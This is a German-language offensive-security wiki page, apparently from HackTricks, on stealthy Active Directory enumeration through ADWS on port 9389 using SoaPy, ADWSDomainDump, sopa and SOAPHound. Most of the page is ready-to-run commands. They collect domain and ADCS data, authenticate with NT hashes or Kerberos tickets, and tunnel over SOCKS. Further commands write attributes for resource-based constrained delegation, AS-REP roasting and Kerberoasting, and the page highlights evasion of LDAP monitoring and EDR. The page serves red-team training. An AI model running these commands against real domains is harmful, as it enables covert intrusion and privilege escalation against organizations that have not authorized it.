# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Was ist ADWS?

Active Directory Web Services (ADWS) ist **seit Windows Server 2008 R2 standardmäßig auf jedem Domain Controller aktiviert** und lauscht auf TCP **9389**.  Trotz des Namens wird **kein HTTP verwendet**.  Stattdessen stellt der Dienst LDAP-ähnliche Daten über einen Stack proprietärer .NET-Framing-Protokolle bereit:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Da der Traffic in diesen binären SOAP-Frames gekapselt ist und über einen ungewöhnlichen Port übertragen wird, ist **Enumeration über ADWS wesentlich weniger wahrscheinlich Gegenstand von Inspektion, Filterung oder Signaturerkennung als klassischer LDAP/389- und 636-Traffic**.  Für Operatoren bedeutet das:<sup>[[1]](#references)[[7]](#references)</sup>

* Unauffälligere Recon – Blue Teams konzentrieren sich häufig auf LDAP-Abfragen.
* Die Möglichkeit, Daten von **Nicht-Windows-Hosts (Linux, macOS)** zu sammeln, indem 9389/TCP über einen SOCKS-Proxy getunnelt wird.
* Dieselben Daten, die über LDAP abgerufen werden könnten (Benutzer, Gruppen, ACLs, Schema usw.), sowie die Möglichkeit, **Schreibvorgänge** durchzuführen (z. B. `msDs-AllowedToActOnBehalfOfOtherIdentity` für **RBCD**).

ADWS-Interaktionen werden über WS-Enumeration implementiert: Jede Abfrage beginnt mit einer `Enumerate`-Nachricht, die den LDAP-Filter/die Attribute definiert und eine `EnumerationContext`-GUID zurückgibt. Darauf folgen eine oder mehrere `Pull`-Nachrichten, die bis zum vom Server definierten Ergebnisfenster streamen.<sup>[[7]](#references)</sup> Kontexte verfallen nach etwa 30 Minuten. Daher muss ein Tool entweder Ergebnisse seitenweise abrufen oder Filter aufteilen (Präfixabfragen pro CN), um den Status nicht zu verlieren.<sup>[[8]](#references)</sup> Wenn Sicherheitsdeskriptoren abgefragt werden, sollte das `LDAP_SERVER_SD_FLAGS_OID`-Control angegeben werden, um SACLs auszulassen. Andernfalls entfernt ADWS das Attribut `nTSecurityDescriptor` einfach aus seiner SOAP-Antwort.

> HINWEIS: ADWS wird auch von vielen RSAT-GUI-/PowerShell-Tools verwendet, daher kann sich der Traffic mit legitimer Administrationsaktivität vermischen.

## SoaPy – Nativer Python-Client

[SoaPy](https://github.com/logangoins/soapy) ist eine **vollständige Neuimplementierung des ADWS-Protokollstacks in reinem Python**.  Das Tool erstellt die NBFX/NBFSE/NNS/NMF-Frames Byte für Byte und ermöglicht so das Sammeln von Daten von Unix-ähnlichen Systemen, ohne die .NET-Laufzeitumgebung zu verwenden.<sup>[[1]](#references)[[2]](#references)</sup>

### Hauptfunktionen

* Unterstützt **Proxying über SOCKS** (nützlich von C2-Implants aus).
* Fein abgestufte Suchfilter, identisch zu LDAP `-q '(objectClass=user)'`.
* Optionale **Schreib**operationen (`--set` / `--delete`).
* **BOFHound-Ausgabemodus** zur direkten Verarbeitung durch BloodHound.
* Das Flag `--parse` formatiert Zeitstempel und `userAccountControl` lesbarer, wenn bessere Lesbarkeit für Menschen erforderlich ist.<sup>[[2]](#references)</sup>

### Flags für gezielte Sammlung und Schreiboperationen

SoaPy enthält vorbereitete Schalter, die die häufigsten LDAP-Hunting-Aufgaben über ADWS nachbilden: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds` sowie die Optionen `--query` / `--filter` für benutzerdefinierte Abfragen. Diese können mit Schreibprimitiven wie `--rbcd <source>` (setzt `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN-Staging für gezieltes Kerberoasting) und `--asrep` (setzt `DONT_REQ_PREAUTH` in `userAccountControl`) kombiniert werden.<sup>[[2]](#references)</sup>

Beispiel für eine gezielte SPN-Suche, die nur `samAccountName` und `servicePrincipalName` zurückgibt:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Verwende denselben Host/dieselben Anmeldedaten, um die Findings sofort zu weaponisieren: Liste mit `--rbcds` die RBCD-fähigen Objekte auf und wende anschließend `--rbcd 'WEBSRV01$' --account 'FILE01$'` an, um eine Resource-Based Constrained Delegation-Kette vorzubereiten (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) für den vollständigen Abuse-Pfad).

### Installation (Operator-Host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump über ADWS (Linux/Windows)

* Fork von `ldapdomaindump`, der LDAP-Abfragen durch ADWS-Aufrufe über TCP/9389 ersetzt, um Treffer durch LDAP-Signaturen zu reduzieren.
* Führt eine anfängliche Erreichbarkeitsprüfung für 9389 durch, sofern nicht `--force` übergeben wird (überspringt die Prüfung, wenn Port-Scans auffällig oder gefiltert sind).
* Gegen Microsoft Defender for Endpoint und CrowdStrike Falcon getestet; im README wird ein erfolgreicher Bypass beschrieben.<sup>[[4]](#references)</sup>

### Installation
```bash
pipx install .
```
### Verwendung
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Die typische Ausgabe protokolliert die Erreichbarkeitsprüfung auf Port 9389, den ADWS-Bind sowie den Start und das Ende des Dumps:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Ein praktischer Client für ADWS in Golang

Ähnlich wie soapy implementiert [sopa](https://github.com/Macmod/sopa) den ADWS-Protokollstack (MS-NNS + MC-NMF + SOAP) in Golang und stellt Command-Line-Flags bereit, um ADWS-Aufrufe auszuführen, wie zum Beispiel:<sup>[[5]](#references)</sup>

* **Objektsuche und -abruf** - `query` / `get`
* **Objektlebenszyklus** - `create [user|computer|group|ou|container|custom]` und `delete`
* **Attributbearbeitung** - `attr [add|replace|delete]`
* **Accountverwaltung** - `set-password` / `change-password`
* sowie weitere Befehle wie `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` usw.

### Zentrale Aspekte der Protokollzuordnung

* LDAP-ähnliche Suchen werden über **WS-Enumeration** (`Enumerate` + `Pull`) mit Attributprojektion, Bereichssteuerung (Base/OneLevel/Subtree) und Paginierung ausgeführt.
* Der Abruf einzelner Objekte verwendet **WS-Transfer** `Get`; Attributänderungen verwenden `Put`; Löschvorgänge verwenden `Delete`.
* Die integrierte Objekterstellung verwendet **WS-Transfer ResourceFactory**; benutzerdefinierte Objekte verwenden einen durch YAML-Templates gesteuerten **IMDA AddRequest**.
* Passwortoperationen sind **MS-ADCAP**-Aktionen (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Nicht authentifizierte Metadatenerkennung (mex)

ADWS stellt WS-MetadataExchange ohne Credentials bereit. Dies ist eine schnelle Möglichkeit, die Erreichbarkeit vor der Authentifizierung zu überprüfen:<sup>[[5]](#references)</sup>
```bash
sopa mex --dc <DC>
```
### Hinweise zur DNS/DC-Ermittlung und zum Kerberos-Targeting

Sopa kann DCs über SRV auflösen, wenn `--dc` weggelassen und `--domain` angegeben wird. Die Abfragen erfolgen in dieser Reihenfolge, und das Ziel mit der höchsten Priorität wird verwendet:<sup>[[5]](#references)</sup>
```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```
In der Praxis sollte ein vom DC kontrollierter Resolver verwendet werden, um Fehler in segmentierten Umgebungen zu vermeiden:

* Verwende `--dns <DC-IP>`, damit **alle** SRV/PTR/Forward-Lookups über den DC-DNS laufen.
* Verwende `--dns-tcp`, wenn UDP blockiert ist oder SRV-Antworten groß sind.
* Wenn Kerberos aktiviert ist und `--dc` eine IP-Adresse enthält, führt sopa einen **Reverse-PTR-Lookup** durch, um einen FQDN für das korrekte SPN/KDC-Targeting zu erhalten. Wenn Kerberos nicht verwendet wird, findet kein PTR-Lookup statt.

Beispiel (IP + Kerberos, DNS über den DC erzwingen):
```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```
### Optionen für Auth-Material

Neben Klartextpasswörtern unterstützt sopa **NT hashes**, **Kerberos AES keys**, **ccache** und **PKINIT certificates** (PFX oder PEM) für die ADWS-Authentifizierung. Kerberos wird bei Verwendung von `--aes-key`, `-c` (ccache) oder zertifikatbasierten Optionen impliziert.<sup>[[5]](#references)</sup>
```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```
### Benutzerdefinierte Objekterstellung über Templates

For arbitrary object classes, the `create custom` command consumes a YAML template that maps to an IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` und `rdn` definieren den Container und den relativen DN.
* `attributes[].name` unterstützt `cn` oder den Namespace `addata:cn`.
* `attributes[].type` akzeptiert `string|int|bool|base64|hex` oder explizites `xsd:*`.
* **`ad:relativeDistinguishedName` oder `ad:container-hierarchy-parent` nicht einfügen**; sopa fügt sie automatisch ein.
* `hex`-Werte werden in `xsd:base64Binary` konvertiert; `value: ""` verwenden, um leere Strings zu setzen.

## SOAPHound – ADWS-Sammlung mit hohem Volumen (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ist ein .NET-Collector, der alle LDAP-Interaktionen innerhalb von ADWS hält und mit BloodHound v4 kompatibles JSON ausgibt. Es erstellt einmalig einen vollständigen Cache aus `objectSid`, `objectGUID`, `distinguishedName` und `objectClass` (`--buildcache`) und verwendet ihn anschließend für umfangreiche `--bhdump`-, `--certdump`- (ADCS) oder `--dnsdump`- (AD-integriertes DNS) Durchläufe, sodass nur etwa 35 kritische Attribute den DC verlassen. AutoSplit (`--autosplit --threshold <N>`) teilt Abfragen automatisch anhand des CN-Präfixes auf, damit das 30-minütige EnumerationContext-Timeout in großen Forests nicht überschritten wird.<sup>[[8]](#references)</sup>

Typischer Workflow auf einer domänengebundenen Operator-VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Exportierte JSON-Daten direkt in SharpHound/BloodHound-Workflows eingespeist – siehe [BloodHound methodology](bloodhound.md) für nachgelagerte Graphing-Ideen. AutoSplit macht SOAPHound in Forests mit mehreren Millionen Objekten resilient und hält dabei die Abfrageanzahl niedriger als bei ADExplorer-ähnlichen Snapshots.

## Stealth AD Collection Workflow

Der folgende Workflow zeigt, wie **domain & ADCS objects** über ADWS enumeriert, in BloodHound JSON konvertiert und nach zertifikatbasierten Angriffspfaden gesucht wird – vollständig unter Linux:

1. **9389/TCP tunneln** vom Zielnetzwerk zu deiner Box, z. B. über Chisel, Meterpreter, SSH dynamic port-forward usw.  Exportiere `export HTTPS_PROXY=socks5://127.0.0.1:1080` oder verwende SoaPy’s `--proxyHost/--proxyPort`.

2. **Das root domain object sammeln:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **ADCS-bezogene Objekte aus der Configuration NC sammeln:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **In BloodHound konvertieren:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Lade die ZIP-Datei hoch** in der BloodHound-GUI und führe Cypher-Abfragen wie `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` aus, um Certificate-Eskalationspfade (ESC1, ESC8 usw.) aufzudecken.

### Schreiben von `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombiniere dies mit `s4u2proxy`/`Rubeus /getticket` für eine vollständige **Resource-Based Constrained Delegation**-Kette (siehe [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Werkzeugübersicht

| Zweck | Tool | Hinweise |
|---------|------|-------|
| ADWS-Enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, Lesen/Schreiben |
| ADWS-Dump mit hohem Volumen | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH-/ADCS-/DNS-Modi |
| BloodHound-Import | [BOFHound](https://github.com/bohops/BOFHound) | Konvertiert SoaPy-/ldapsearch-Logs |
| Zertifikatskompromittierung | [Certipy](https://github.com/ly4k/Certipy) | Kann über denselben SOCKS-Proxy geleitet werden |
| ADWS-Enumeration und Objektänderungen | [sopa](https://github.com/Macmod/sopa) | Generischer Client zur Kommunikation mit bekannten ADWS-Endpunkten – ermöglicht Enumeration, Objekterstellung, Attributänderungen und Passwortänderungen |

## Referenzen

- [1] [SpecterOps – SOAP(y) unbedingt verwenden – Ein Leitfaden für Operatoren zur unauffälligen AD-Sammlung über ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy auf GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound auf GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump auf GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa auf GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – Spezifikationen MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Unauffällige Enumeration von Active-Directory-Umgebungen über ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – SOAPHound-Tool zur Sammlung von Active-Directory-Daten über ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
